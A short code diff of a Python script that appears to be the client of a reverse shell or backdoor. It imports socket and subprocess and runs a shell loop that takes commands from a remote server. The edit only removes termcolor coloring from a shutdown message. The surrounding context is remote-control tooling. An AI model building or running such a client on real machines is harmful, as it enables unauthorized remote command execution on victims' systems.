@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 import socket
-from termcolor import colored
+# from termcolor import colored
 import subprocess
 import json
 from sys import exit
@@ -30,7 +30,8 @@ def shell(_s):
 	while True:
 		command = reliable_recv(_s)
 		if command == 'q':
-			print(colored('[-] Instruction to close sent from the server', 'red'))
+			print('[-] Instruction to close sent from the server')
+			# print(colored('[-] Instruction to close sent from the server', 'red'))
 			_s.close()
 			exit(1)
 			break
